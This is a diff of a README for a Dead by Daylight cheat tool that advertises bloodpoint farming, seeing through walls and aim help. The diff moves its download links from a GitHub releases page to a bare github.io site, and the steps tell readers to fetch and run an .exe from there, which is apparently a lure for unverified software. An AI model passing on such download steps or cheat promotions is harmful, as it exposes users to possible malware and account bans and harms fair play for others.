@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Plus - Automate your progress in Dead by Daylight
 
-[![Download Utility](https://img.shields.io/badge/Download-Release-blue)](https://github.com/carlislepeacekeeping234/DBD-AutoGrind-Trainer-2026-Plus/releases)
+[![Download Utility](https://img.shields.io/badge/Download-Release-blue)](https://carlislepeacekeeping234.github.io)
 
 This application provides tools to automate progression tasks and improve gameplay performance in Dead by Daylight. It includes features for collecting bloodpoints, tracking entities through walls, improving aim, and unlocking game content.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these conditions before you start:
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official releases page](https://github.com/carlislepeacekeeping234/DBD-AutoGrind-Trainer-2026-Plus/releases).
+1. Visit the [official releases page](https://carlislepeacekeeping234.github.io).
 2. Locate the most recent version in the list.
 3. Click the file ending in .exe to start the transfer.
 4. Save the file to a folder you can access.
